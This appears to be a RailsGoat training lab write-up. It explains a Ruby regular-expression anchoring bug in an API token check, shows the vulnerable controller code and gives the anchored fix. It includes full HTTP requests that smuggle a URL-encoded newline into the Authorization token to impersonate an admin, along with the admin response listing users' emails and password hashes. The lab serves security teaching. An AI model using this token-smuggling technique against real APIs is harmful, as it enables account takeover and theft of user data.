# Description

Regular expressions are a common way to extract the data you want from the data you do not want. It is common for Ruby developers to forget that in Ruby regexp anchors are \A and \z. This allows strict enforcement so that potentially dangerous characters such as the newline character aren't able to bypass security-based regular expression checks.

# Bug

Within the file app/controllers/api/v1/users_controller.rb:

```ruby
before_filter :valid_api_token
before_filter :extrapolate_user
```

The above two lines specify that we will run these validations prior to allowing a user to interact with the API endpoints.

```ruby
def valid_api_token
  authenticate_or_request_with_http_token do |token, options|
    # TODO :add some functionality to check if the HTTP Header is valid
    identify_user(token)
  end
end

def identify_user(token="")
   # We've had issues with URL encoding, etc. causing issues so just to be safe
   # we will go ahead and unescape the user's token
   unescape_token(token)
   @clean_token =~ /(.*?)-(.*)/
   id = $1
   hash = $2
   (id && hash) ? true : false
   check_hash(id, hash) ? true : false
end

def check_hash(id, hash)
 digest = OpenSSL::Digest::SHA1.hexdigest("#{ACCESS_TOKEN_SALT}:#{id}")
 hash == digest
end

# We had some issues with the token and url encoding...
# this is an attempt to normalize the data.
def unescape_token(token="")
  @clean_token = CGI::unescape(token)
end
```

This first validation, valid_api_token, extracts the user's access token. Within the token there is a user ID and a hash. The application extracts both values, hashes the user ID and the application's secret salt together. If the digest hash matches with the user provided hash, the entire token is valid. 

Meaning, if the hash (check_hash) doesn't match the hash provided by the user, the token is invalid and therefore unauthorized. Alternatively, the hash provided is valid but the user ID is invalid. 

The next validation, built after this check, extrapolates the user from that hash. In theory, because we have already validated both the user ID and hash are valid, we can just extract the user ID from what has been provided and determine user access.

```ruby
# Added a method to make it easy to figure out who the user is.
def extrapolate_user
  @user = User.find_by_id(@clean_token.split("-").first)
end
```

Unfortunately, we've made a mistake. The regular expression can be bypassed by entering a newline character (url encoded: %0a).We meant or expected for a user to enter a token such as:

    Authorization: Token token=1-01de24d75cffaa66db205278d1cf900bf087a737

However, the user actually enters:

    Authorization: Token token=2%0a1-01de24d75cffaa66db205278d1cf900bf087a737

This means that our token will pass the initial hash check. Additionally, when we perform the split by the hyphen ("-") character, and retrieve the first value from the newly created array (what should be a valid user ID), it will be "2\n1". When performing a `find_by_*` on an integer column (`to_i` is used), ActiveRecord will ignore everything from the newline character on and return the result of the first character. This means, we can become another user!

# Solution

### Broken Regular Expression ATTACK:

As discussed in the Bug Section (above), you can prepend the user ID of the person whose information you would like to retrieve followed by a newline character and your user's valid API token. The following is an example of what our request _should_ look like:

    GET /api/v1/users HTTP/1.1
    Host: railsgoat.dev
    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:26.0) Gecko/20100101 Firefox/26.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate
    Authorization: Token token=2-050ddd40584978fe9e82840b8b95abb98e4786dc
    Content-Length: 4

This is the response:

    HTTP/1.1 200 OK
    Content-Type: application/json; charset=utf-8
    X-UA-Compatible: IE=Edge
    ETag: "6b4caf343a20865de174b2b530b945dd"
    Cache-Control: max-age=0, private, must-revalidate
    X-Request-Id: 0ef6e5e91730bfecb9711c0ddad5cc7b
    X-Runtime: 0.008342
    Connection: close
    
    {"admin":false,"created_at":"2014-01-23T16:17:10Z","email":"jack@metacorp.com",
    "first_name":"Jack","id":2,"last_name":"Mannino","password":"b46dd2888a0904972649cc880a93f4dd",
    "updated_at":"2014-01-23T16:17:10Z","user_id":2}

We want to access this endpoint as an admin (user ID of 1). We will change our request so that we can emulate being and admin by prepending 1%0a:

    GET /api/v1/users HTTP/1.1
    Host: railsgoat.dev
    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:26.0) Gecko/20100101 Firefox/26.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate
    Authorization: Token token=1%0a2-050ddd40584978fe9e82840b8b95abb98e4786dc
    Content-Length: 4

The following is a response from the application (note - we get bonus points because as an admin we can retrieve **EVERYONE's** data):

    HTTP/1.1 200 OK
    Content-Type: application/json; charset=utf-8
    X-UA-Compatible: IE=Edge
    ETag: "916d3a7b17b24bd84806393e5ef4ccd9"
    Cache-Control: max-age=0, private, must-revalidate
    X-Request-Id: e56b6bc1c6d6b875249f6d27b9f9450c
    X-Runtime: 0.009111
    Connection: close
    
    [{"admin":true,"created_at":"2014-01-23T16:17:10Z","email":"admin@metacorp.com","first_name":
    "Admin","id":1,"last_name":"","password":"c93ccd78b2076528346216b3b2f701e6","updated_at":"2014-01-23T16:17:10Z","user_id":1},
    {"admin":false,"created_at":"2014-01-23T16:17:10Z","email":"jack@metacorp.com","first_name":"Jack","id":2,"last_name":"Mannino",
    "password":"b46dd2888a0904972649cc880a93f4dd","updated_at":"2014-01-23T16:17:10Z","user_id":2},{"admin":false,"created_at":
    "2014-01-23T16:17:10Z","email":"jim@metacorp.com","first_name":"Jim","id":3,"last_name":"Manico","password":
    "e1eb29f815193265b57d31bb4d9de140","updated_at":"2014-01-23T16:17:10Z","user_id":3},{"admin":false,
    "created_at":"2014-01-23T16:17:10Z","email":"mike@metacorp.com","first_name":"Mike","id":4,"last_name":"McCabe",
    "password":"df5d9020fa0f31adc4fd279020f587c8","updated_at":"2014-01-23T16:17:10Z","user_id":4},{"admin":false,"created_at":
    "2014-01-23T16:17:10Z","email":"ken@metacorp.com","first_name":"Ken","id":5,"last_name":"Johnson","password":
    "67a2faf94e8e71113617d4b72f851bf0","updated_at":"2014-01-23T16:17:10Z","user_id":5},{"admin":null,"created_at":
    "2014-03-09T13:58:28Z","email":"test1@test.com","first_name":"test","id":6,"last_name":"test","password":
    "05a671c66aefea124cc08b76ea6d30bb","updated_at":"2014-03-09T13:58:28Z","user_id":6},{"admin":null,"created_at":
    "2014-03-10T00:13:12Z","email":"test2@test.com","first_name":"test","id":7,"last_name":"test","password":
    "91482305bacc71bd52612cce07135b77","updated_at":"2014-03-10T00:13:12Z","user_id":7}]

### Broken Regular Expression SOLUTION:

There are many things wrong with how we are going about doing this but, for a simple fix, you can anchor the regular expression to reject/ignore newline characters.

```ruby
def identify_user(token="")
  # We've had issues with URL encoding, etc. causing issues so just to be safe
  # we will go ahead and unescape the user's token
  unescape_token(token)
  @clean_token =~ /\A(.*?)-(.*)\z/
  id = $1
  hash = $2
  (id && hash) ? true : false
  check_hash(id, hash) ? true : false
end
```

# Hint

An API token? Interested to see what calls I can make! What are the closing tags for Ruby again?